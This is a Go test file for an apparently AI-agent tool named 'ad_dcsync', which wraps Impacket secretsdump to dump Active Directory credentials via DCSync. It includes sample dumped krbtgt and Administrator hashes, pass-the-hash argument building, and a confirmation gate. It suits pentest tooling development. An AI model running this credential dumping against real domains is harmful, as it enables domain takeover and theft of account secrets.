package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

const dcsyncTestOut = `Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
CORP.LOCAL\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::
CORP.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fedcba9876543210fedcba9876543210:::
[*] Kerberos keys grabbed
`

func TestParseDCSyncHashes(t *testing.T) {
	hashes := parseDCSyncHashes(dcsyncTestOut + dcsyncTestOut)
	if len(hashes) != 2 {
		t.Fatalf("hashes = %d, want 2: %+v", len(hashes), hashes)
	}
	if hashes[0].AccountName != "krbtgt" || hashes[0].RID != "502" ||
		hashes[0].NTHash != "0123456789abcdef0123456789abcdef" {
		t.Errorf("hash[0] = %+v", hashes[0])
	}
	if hashes[1].AccountName != "Administrator" || hashes[1].RID != "500" {
		t.Errorf("hash[1] = %+v", hashes[1])
	}
}

func TestBuildDCSyncArgs(t *testing.T) {
	p := &dcsyncParams{DC: "10.0.0.10", Domain: "CORP.LOCAL", TargetUser: "krbtgt"}
	args, err := buildDCSyncArgs(p, &resolvedKerberoastCred{Username: "alice", Password: "P@ss"})
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	if !strings.HasPrefix(joined, "CORP.LOCAL/alice:P@ss@10.0.0.10 -dc-ip 10.0.0.10 -just-dc-user krbtgt") {
		t.Errorf("args = %s", joined)
	}
	if strings.Contains(joined, "-just-dc ") {
		t.Errorf("must not use full -just-dc: %s", joined)
	}

	args, err = buildDCSyncArgs(p, &resolvedKerberoastCred{Username: "alice", Hash: strings.Repeat("a", 32)})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(args, " "), "-hashes "+kerbEmptyLMHash+":"+strings.Repeat("a", 32)) {
		t.Errorf("hash args = %v", args)
	}
}

func stubDCSync(t *testing.T, out string, runErr error) *[]string {
	t.Helper()
	oldLocate, oldExec := dcsyncLocateRunner, dcsyncExecRunner
	var got []string
	dcsyncLocateRunner = func() (kerberoastRunner, error) {
		return kerberoastRunner{Bin: "python3", BaseArgs: []string{"secretsdump.py"}}, nil
	}
	dcsyncExecRunner = func(_ context.Context, _ kerberoastRunner, args []string, _ time.Duration) (string, error) {
		got = append([]string{}, args...)
		return out, runErr
	}
	t.Cleanup(func() { dcsyncLocateRunner, dcsyncExecRunner = oldLocate, oldExec })
	return &got
}

func callDCSync(t *testing.T, ts *ToolSet, payload any) dcsyncResult {
	t.Helper()
	raw, _ := json.Marshal(payload)
	res, err := ts.dcsyncHandler(context.Background(), raw)
	if err != nil {
		t.Fatalf("handler transport error: %v", err)
	}
	if res.IsError {
		t.Fatalf("handler tool error: %s", res.Flatten())
	}
	var out dcsyncResult
	if err := json.Unmarshal([]byte(res.Flatten()), &out); err != nil {
		t.Fatalf("unmarshal: %v\n%s", err, res.Flatten())
	}
	return out
}

func TestDCSyncRequiresConfirm(t *testing.T) {
	ts := NewToolSet(nil, "tester")
	raw, _ := json.Marshal(map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL", "target_user": "krbtgt",
		"username": "alice", "password": "x", "confirm": false,
	})
	res, err := ts.dcsyncHandler(context.Background(), raw)
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError || !strings.Contains(res.Flatten(), "confirm=true") {
		t.Fatalf("res = %v %q", res.IsError, res.Flatten())
	}
}

func TestDCSyncHandlerSuccess(t *testing.T) {
	args := stubDCSync(t, dcsyncTestOut, nil)
	ts := NewToolSet(nil, "tester")
	out := callDCSync(t, ts, map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL", "target_user": "krbtgt",
		"username": "alice", "password": "P@ss", "confirm": true,
	})
	if out.Status != "success" || len(out.Hashes) != 2 {
		t.Fatalf("out = %+v", out)
	}
	if out.Auth == nil || out.Auth.Username != "alice" || out.Auth.Source != "explicit" {
		t.Errorf("auth = %+v", out.Auth)
	}
	joined := strings.Join(*args, " ")
	if !strings.Contains(joined, "-just-dc-user krbtgt") || strings.Contains(joined, "-just-dc ") {
		t.Errorf("args = %s", joined)
	}
}

func TestDCSyncDryRun(t *testing.T) {
	stubDCSync(t, "", nil)
	ts := NewToolSet(nil, "tester")
	out := callDCSync(t, ts, map[string]any{
		"dc": "127.0.0.1", "domain": "CORP.LOCAL", "target_user": "krbtgt",
		"dry_run": true,
	})
	if out.Status != "dry_run" || out.Tooling == nil {
		t.Fatalf("out = %+v", out)
	}
	if out.Tooling["impacket_ready"] != true {
		t.Errorf("tooling = %+v", out.Tooling)
	}
}

func TestDCSyncAccessDeniedClassified(t *testing.T) {
	stubDCSync(t, "[-] rpc_s_access_denied", errors.New("exit status 1"))
	ts := NewToolSet(nil, "tester")
	out := callDCSync(t, ts, map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL", "target_user": "krbtgt",
		"username": "alice", "password": "x", "confirm": true,
	})
	if out.Status != "failed" || !strings.Contains(out.Error, "复制权限") {
		t.Fatalf("out = %+v", out)
	}
}

func TestDCSyncInWorkerSetAndSeeds(t *testing.T) {
	found := false
	for _, tool := range NewToolSet(nil, "").WorkerTools() {
		if tool.Name() == "ad_dcsync" {
			found = true
			if !strings.Contains(tool.Description(), "T1003.006") {
				t.Error("description missing T1003.006")
			}
		}
	}
	if !found {
		t.Fatal("ad_dcsync not in WorkerTools")
	}
	for _, seed := range BuiltinToolSeeds() {
		if seed.Key != "ad_dcsync" {
			continue
		}
		for _, a := range seed.Agents {
			if a == "worker" {
				return
			}
		}
		t.Fatalf("ad_dcsync agents = %v, want worker", seed.Agents)
	}
	t.Fatal("ad_dcsync not seeded")
}

func TestDCSyncNilStore(t *testing.T) {
	ts := NewToolSet(nil, "")
	res, err := ts.toolDCSync().Call(context.Background(),
		json.RawMessage(`{"dc":"10.0.0.10","domain":"CORP.LOCAL","target_user":"krbtgt","username":"a","password":"x","confirm":true}`), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError || !strings.Contains(res.Flatten(), "任务上下文") {
		t.Fatalf("res = %v %q", res.IsError, res.Flatten())
	}
}

func TestDCSyncRunnerRealHelp(t *testing.T) {
	runner, err := dcsyncLocateRunner()
	if err != nil {
		t.Skipf("impacket secretsdump not installed: %v", err)
	}
	out, err := execKerberoastCommand(context.Background(), runner, []string{"-h"}, 15*time.Second)
	if err != nil {
		t.Fatalf("secretsdump -h failed: %v\n%s", err, out)
	}
	if !strings.Contains(strings.ToLower(out), "usage") {
		t.Fatalf("unexpected -h output: %s", out)
	}
}
